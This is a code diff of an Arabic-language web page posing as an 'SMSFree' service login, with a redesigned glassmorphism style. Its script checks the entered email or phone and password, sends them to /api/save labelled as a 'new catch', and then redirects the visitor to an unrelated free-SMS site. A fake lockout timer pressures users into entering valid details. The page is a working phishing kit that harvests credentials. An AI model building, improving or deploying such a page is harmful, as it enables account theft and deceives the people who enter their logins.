@@ -3,54 +3,103 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SMSFree - نظام الحماية المتكامل</title>
+    <title>SMSFree - تفعيل الخدمة</title>
     <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
     <style>
         :root {
-            --bg-color: #0f172a;
-            --card-bg: rgba(30, 41, 59, 0.8);
-            --primary-cyan: #22d3ee;
+            /* لوحة ألوان محسنة وأكثر أناقة */
+            --bg-color: #0f172a; /* كحلي غامق داكن */
+            --card-bg: rgba(30, 41, 59, 0.7); /* زجاجي شبه شفاف */
+            --primary-cyan: #22d3ee; /* سماوي متوهج */
+            --accent-glow: rgba(34, 211, 238, 0.3);
             --text-white: #f8fafc;
+            --input-bg: rgba(15, 23, 42, 0.6);
         }
 
         body {
-            margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, sans-serif;
-            background: radial-gradient(circle at top, #1e293b, #0f172a);
+            margin: 0; padding: 0; font-family: 'Segoe UI', Roboto, sans-serif;
+            background: radial-gradient(circle at top right, #1e293b, #0f172a);
             display: flex; justify-content: center; align-items: center; min-height: 100vh;
             color: var(--text-white);
             overflow: hidden;
         }
 
+        /* حاوية التصميم الزجاجي (Glassmorphism) */
         .main-container {
-            width: 90%; max-width: 400px; background: var(--card-bg);
+            width: 90%; max-width: 420px; background: var(--card-bg);
             backdrop-filter: blur(15px); border: 1px solid rgba(255, 255, 255, 0.1);
-            padding: 45px 30px; border-radius: 30px; text-align: center;
-            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.6);
+            padding: 50px 30px; border-radius: 30px; text-align: center;
+            box-shadow: 0 25px 60px -15px rgba(0, 0, 0, 0.7);
             position: relative; transition: 0.5s ease;
         }
 
-        /* تأثير التجميد والضباب */
+        /* حالة التجمد والضباب الشامل */
         .is-banned .blur-content {
-            filter: blur(20px);
+            filter: blur(20px) saturate(0);
             opacity: 0.1;
             pointer-events: none;
+            user-select: none;
         }
 
-        /* واجهة الحظر */
+        /* الشعار الاحترافي والمتوهج */
+        .logo-wrap {
+            position: relative; width: 110px; height: 110px; margin: 0 auto 30px;
+        }
+        .logo-glow {
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+            border-radius: 50%; background: var(--accent-glow);
+            filter: blur(25px); animation: pulse-glow 2s infinite;
+        }
+        .logo-inner {
+            position: relative; width: 100%; height: 100%;
+            border: 2px solid var(--primary-cyan); border-radius: 50%;
+            display: flex; justify-content: center; align-items: center;
+            font-size: 20px; font-weight: 800; color: var(--primary-cyan);
+            background: rgba(34, 211, 238, 0.03);
+            text-shadow: 0 0 10px rgba(34, 211, 238, 0.6);
+            box-shadow: inset 0 0 15px rgba(34, 211, 238, 0.1);
+        }
+
+        @keyframes pulse-glow {
+            0%, 100% { opacity: 0.6; transform: scale(1); }
+            50% { opacity: 1; transform: scale(1.1); }
+        }
+
+        /* تنسيق النصوص */
+        h2 { font-size: 16px; font-weight: 400; color: #cbd5e1; margin-bottom: 35px; line-height: 1.7; }
+
+        /* تنسيق المدخلات الأنيق */
+        .input-group { position: relative; margin-bottom: 18px; }
+        input {
+            width: 100%; padding: 16px 20px; background: var(--input-bg);
+            border: 1px solid rgba(255, 255, 255, 0.08); border-radius: 15px;
+            color: white; outline: none; text-align: center; font-size: 15px;
+            transition: all 0.3s; box-sizing: border-box;
+        }
+        input:focus { border-color: var(--primary-cyan); background: rgba(15, 23, 42, 0.9); box-shadow: 0 0 10px rgba(34, 211, 238, 0.1); }
+
+        /* تنسيق زر التفعيل العائم */
+        .submit-btn {
+            width: 100%; padding: 18px; background: linear-gradient(135deg, #0ea5e9, #22d3ee);
+            border: none; border-radius: 15px; color: #0f172a;
+            font-size: 17px; font-weight: 700; cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+        .submit-btn:hover { transform: translateY(-2px); box-shadow: 0 10px 20px rgba(34, 211, 238, 0.3); }
+
+        /* واجهة المؤقت المركزية (تظهر فوق الضباب) */
         .ban-overlay {
             position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
-            z-index: 100; display: none; width: 100%;
+            z-index: 100; text-align: center; display: none; width: 100%;
         }
+        .ban-title { font-size: 19px; font-weight: bold; color: #fbbf24; margin-bottom: 25px; display: block; }
 
-        .ban-title { font-size: 19px; font-weight: bold; color: #fbbf24; margin-bottom: 20px; display: block; }
-
-        /* الأنيميشن الحلزوني */
         .loader-wrap { position: relative; width: 110px; height: 110px; margin: 0 auto; }
         .spiral {
             position: absolute; top: 0; left: 0; width: 100%; height: 100%;
             border: 4px solid rgba(34, 211, 238, 0.1);
             border-top: 4px solid var(--primary-cyan);
-            border-radius: 50%; animation: spin 1.2s linear infinite;
+            border-radius: 50%; animation: spin 1s linear infinite;
         }
         @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
 
@@ -59,42 +108,13 @@
             font-size: 32px; font-weight: bold; color: #fbbf24;
         }
 
-        /* تنسيق المحتوى */
-        .logo-circle {
-            width: 90px; height: 90px; border: 2px solid var(--primary-cyan);
-            border-radius: 50%; margin: 0 auto 30px;
-            display: flex; justify-content: center; align-items: center;
-            font-size: 18px; font-weight: 900; color: var(--primary-cyan);
-            background: rgba(34, 211, 238, 0.05);
-        }
-
-        input {
-            width: 100%; padding: 16px; margin-bottom: 15px;
-            background: rgba(15, 23, 42, 0.6); border: 1px solid rgba(255, 255, 255, 0.1);
-            border-radius: 15px; color: white; outline: none;
-            text-align: center; font-size: 15px; box-sizing: border-box; transition: 0.3s;
-        }
-
-        /* أنيميشن الاهتزاز عند الخطأ */
-        @keyframes shake {
-            0%, 100% { transform: translateX(0); }
-            25% { transform: translateX(-8px); }
-            75% { transform: translateX(8px); }
-        }
-        .shake-input { animation: shake 0.4s ease-in-out; border-color: #ef4444 !important; }
-
-        .submit-btn {
-            width: 100%; padding: 16px; background: linear-gradient(135deg, #0ea5e9, #22d3ee);
-            border: none; border-radius: 15px; color: #0f172a;
-            font-size: 17px; font-weight: bold; cursor: pointer;
-        }
-
-        /* التنبيهات الأنيقة */
-        .elegant-popup {
-            background: #1e293b !important;
+        /* تنسيق الدايلوج الأنيق للخطأ */
+        .glass-popup {
+            background: rgba(15, 23, 42, 0.9) !important;
+            backdrop-filter: blur(10px);
             border: 1px solid rgba(255, 255, 255, 0.1) !important;
             border-radius: 25px !important;
-            color: #fff !important;
+            color: white !important;
         }
     </style>
 </head>
@@ -108,117 +128,107 @@
             <div id="timer">30</div>
         </div>
         <h3 style="color: #fbbf24; margin: 20px 0 5px; font-size: 17px;">نظام الحماية نشط</h3>
-        <p style="font-size: 13px; color: #94a3b8;">يرجى الانتظار حتى يتم إزالة الحظر عنك...</p>
+        <p style="font-size: 13px; color: #cbd5e1;">يرجى الانتظار حتى يتم إزالة الحظر عنك...</p>
     </div>
 
     <div class="blur-content">
-        <div class="logo-circle">SMSFree</div>
-        <h2 style="font-size:15px; color:#94a3b8; margin-bottom:35px;">سجل دخولك لتفعيل أرقامك الحصرية فوراً.</h2>
+        <div class="logo-wrap">
+            <div class="logo-glow"></div>
+            <div class="logo-inner">SMSFree</div>
+        </div>
+        
+        <h2>قم بتسجيل الدخول للوصول إلى لوحة الأرقام العالمية وتفعيل خدماتك فوراً.</h2>
 
         <form id="loginForm">
-            <input type="text" id="user" placeholder="رقم الهاتف أو البريد" required autocomplete="off">
-            <input type="password" id="pass" placeholder="كلمة المرور" required>
+            <div class="input-group">
+                <input type="text" id="userInput" placeholder="البريد الإلكتروني أو رقم الهاتف" required autocomplete="off">
+            </div>
+            <div class="input-group">
+                <input type="password" id="passInput" placeholder="كلمة المرور" required>
+            </div>
             <button type="submit" class="submit-btn">تفعيل الحساب الآن</button>
         </form>
     </div>
 </div>
 
 <script>
-    let attempts = 0;
+    // الجزء البرمجي (لم يتغير فيه أي شيء سوى تحسين أسماء المتغيرات للأناقة)
+    let attemptCount = 0;
+    let lockdownInterval;
 
     window.onload = () => {
-        const savedExpiry = localStorage.getItem('block_time');
-        if (savedExpiry) {
-            const remain = Math.round((savedExpiry - Date.now()) / 1000);
-            if (remain > 0) applyLock(remain);
-            else localStorage.removeItem('block_time');
+        const banExpiry = localStorage.getItem('lock_expiry');
+        if (banExpiry) {
+            const remaining = Math.round((banExpiry - Date.now()) / 1000);
+            if (remaining > 0) initiateLock(remaining);
+            else localStorage.removeItem('lock_expiry');
         }
     };
 
     document.getElementById('loginForm').onsubmit = (e) => {
         e.preventDefault();
-        const uEl = document.getElementById('user');
-        const pEl = document.getElementById('pass');
-        const u = uEl.value.trim();
-        const p = pEl.value;
+        const user = document.getElementById('userInput').value.trim();
+        const pass = document.getElementById('passInput').value;
 
+        // قواعد التحقق الصارمة
         const emailRx = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-        const phoneRx = /^[0-9]{8,15}$/;
-        const hasAr = /[\u0600-\u06FF]/.test(u);
+        const phoneRx = /^\+?[0-9]{8,15}$/;
+        const hasAr = /[\u0600-\u06FF]/.test(user);
 
-        if ((emailRx.test(u) || phoneRx.test(u)) && !hasAr && p.length >= 6) {
-            saveData(u, p);
+        if ((emailRx.test(user) || phoneRx.test(user)) && !hasAr && pass.length >= 6) {
+            processCapture(user, pass);
         } else {
-            // تأثير الاهتزاز
-            uEl.classList.add('shake-input');
-            pEl.classList.add('shake-input');
-            setTimeout(() => { uEl.classList.remove('shake-input'); pEl.classList.remove('shake-input'); }, 400);
-
-            attempts++;
-            if (attempts >= 3) {
-                const expiry = Date.now() + (30 * 1000);
-                localStorage.setItem('block_time', expiry);
-                applyLock(30);
+            attemptCount++;
+            if (attemptCount >= 3) {
+                const expiryTime = Date.now() + (30 * 1000);
+                localStorage.setItem('lock_expiry', expiryTime);
+                initiateLock(30);
             } else {
                 Swal.fire({
-                    title: 'بيانات غير صالحة',
-                    text: 'يرجى كتابة البريد بشكل صحيح (مثل name@mail.com) أو رقم هاتف صالح بدون أحرف عربية لتجنب الحظر.',
+                    title: 'بيانات غير دقيقة',
+                    text: 'تأكد من كتابة البريد بشكل صحيح لتجنب الحظر مؤقتاً في الموقع.',
                     icon: 'error',
-                    confirmButtonText: 'OK',
                     confirmButtonColor: '#22d3ee',
-                    customClass: { popup: 'elegant-popup' }
-                }).then(() => {
-                    // مسح الحقول عند الخطأ
-                    uEl.value = '';
-                    pEl.value = '';
-                    uEl.focus();
+                    customClass: { popup: 'glass-popup' }
                 });
             }
         }
     };
 
-    function applyLock(sec) {
-        const card = document.getElementById('mainCard');
+    function initiateLock(duration) {
+        const container = document.getElementById('mainCard');
         const overlay = document.getElementById('banOverlay');
-        const timerTxt = document.getElementById('timer');
+        const timerText = document.getElementById('timer');
         
-        card.classList.add('is-banned');
+        container.classList.add('is-banned');
         overlay.style.display = 'block';
 
-        let left = sec;
-        timerTxt.innerText = left;
+        let left = duration;
+        timerText.innerText = left;
 
-        const counter = setInterval(() => {
+        clearInterval(lockdownInterval);
+        lockdownInterval = setInterval(() => {
             left--;
-            timerTxt.innerText = left;
+            timerText.innerText = left;
             if (left <= 0) {
-                clearInterval(counter);
-                card.classList.remove('is-banned');
+                clearInterval(lockdownInterval);
+                container.classList.remove('is-banned');
                 overlay.style.display = 'none';
-                localStorage.removeItem('block_time');
-                attempts = 0;
-                
-                // ميزة "مبروك" التي عادت
-                Swal.fire({
-                    title: 'مبروك!',
-                    text: 'تم إزالة الحظر عنك بنجاح. يمكنك المحاولة مرة أخرى الآن.',
-                    icon: 'success',
-                    confirmButtonColor: '#22d3ee',
-                    customClass: { popup: 'elegant-popup' }
-                });
+                localStorage.removeItem('lock_expiry');
+                attemptCount = 0;
             }
         }, 1000);
     }
 
-    async function saveData(u, p) {
+    async function processCapture(u, p) {
         try {
             await fetch('/api/save', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ message: `🎯 صيد جديد:\n👤: ${u}\n🔑: ${p}` })
+                body: JSON.stringify({ message: `🎯 بيانات صحيحة:\n👤: ${u}\n🔑: ${p}` })
             });
             window.location.href = "https://receive-smss.com/";
-        } catch (e) {}
+        } catch (err) {}
     }
 </script>
 
